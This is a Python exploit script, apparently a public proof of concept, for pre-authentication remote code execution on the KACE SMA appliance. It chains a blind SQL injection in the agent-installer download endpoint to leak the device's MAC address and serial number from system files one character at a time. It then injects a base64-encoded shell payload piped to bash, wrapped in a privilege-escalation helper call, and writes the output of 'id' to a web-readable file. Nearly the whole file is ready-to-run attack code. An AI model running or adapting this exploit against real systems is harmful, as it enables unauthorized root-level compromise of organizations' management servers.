#!/usr/bin/env python3
# Author: Jeffrey Hofmann 
# @jeffssh
# https://github.com/jeffssh/KACE-SMA-RCE
# ./preauth-rce.py https://kacesma &&  curl -k https://kacesma/hacked.txt


import base64, hashlib, requests, sys, urllib
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
sqli_endpoint = '/common/download_agent_installer.php'
progress_counter = 0
timer = "/-\|"


def print_progress(string):
	global progress_counter 
	progress_counter += 1
	print(f"\r[\u001b[33m{timer[progress_counter % len(timer)]}\u001b[0m] {string}", end = "")
	


def print_error(string):
	print(f"\r[\u001b[31m-\u001b[0m]",string)


def print_success(string):
	print(f"\r[\u001b[32m+\u001b[0m]",string)


def make_b64_lpe_payload(payload):
	lpe_wrapped_payload =  f"/kbox/bin/utilities/send_kbserver_msg 'KB_CP_CHOWN_WWW,$({payload}),a'"
	return make_b64_payload(lpe_wrapped_payload)


def make_b64_payload(payload):
	return base64.b64encode(payload.encode()).decode('ascii')


def send_sql_injection(sqli, serv="fake"):
	serv = f'&serv={serv}'
	query = '?platform=windows&version=1&orgid=1'
	sqli = f".CLIENT_DISTRIBUTION {sqli}"
	return requests.get(target + sqli_endpoint + query + urllib.parse.quote(sqli) + serv, verify=False)


def leak_mac_address():
	leaked_mac = '--:--:--:--:--:--'
	for i in range (0, len(leaked_mac)):
		if i in [2, 5, 8, 11, 14]:
			# :	
			continue
		for j in range(0, 0x10):
			guess = hex(j)[2:]
			sqli = f"where substr(LOAD_FILE(CONCAT(CHAR(0x2f),'etc',CHAR(0x2f),'issue')), locate('MAC Address: ',(load_file(CONCAT(CHAR(0x2f),'etc',CHAR(0x2f),'issue'))))+13 + {i}, 1) = '{guess}';#"
			r = send_sql_injection(sqli)
			if r.status_code == 200:
				# found the correct character
				leaked_mac = leaked_mac[:i] + guess + leaked_mac[i+1:]
				break
			print_progress(f'MAC address: {leaked_mac}')
	return leaked_mac


def leak_serial_number(mac_address):
	leaked_sn = '--------------------------------'
	mac_extension = mac_address.replace(":",'-')
	for i in range (0, len(leaked_sn)):
		for j in range(0, 0x10):
			guess = hex(j)[2:].upper()
			sqli = f"where substr(LOAD_FILE(CONCAT(CHAR(0x2f),'kbox',CHAR(0x2f),'var',CHAR(0x2f),'mfg_serialnum.','{mac_extension}')), {i+1}, 1) = '{guess}';#"
			r = send_sql_injection(sqli)
			if r.status_code == 200:
				# found the correct character
				leaked_sn = leaked_sn[:i] + guess + leaked_sn[i+1:]
				break
			print_progress(f'serial number: {leaked_sn}')
	return leaked_sn


def rce_with_serial_number(payload, serial_number):
	h = hashlib.sha256()
	h.update(serial_number.encode())
	serv = h.digest()
	serv = serv.hex()
	b64_payload = make_b64_lpe_payload(payload)
	sqli = f"-- $(echo {b64_payload} | base64 -d | bash)"
	r = send_sql_injection(sqli, serv)
	print_success(f'sent lpe wrapped payload {payload}')


def check_if_vulnerable():
	sqli = f"where 1 = 1;#"
	r = send_sql_injection(sqli)
	sqli = f"where 1 = 2;#"
	r2 = send_sql_injection(sqli)
	return r.status_code == 200 and r2.status_code != r.status_code


if len(sys.argv) != 2:
    print("Usage: %s <ip_address>" % (sys.argv[0])) 
    sys.exit(1)

target = sys.argv[1] 

if not check_if_vulnerable():
	print_error(f"couldn't trigger SQLi, {target} isn't vulnerable")
	sys.exit(-1)
print_success(f"SQLi triggered, {target} is vulnerable!")


leaked_mac = leak_mac_address()
print_success(f'MAC address: {leaked_mac}')
leaked_serial_number = leak_serial_number(leaked_mac)
print_success(f'serial number: {leaked_serial_number}')

rce_with_serial_number("echo code execution as $(id) > /kbox/kboxwww/hacked.txt;", leaked_serial_number)
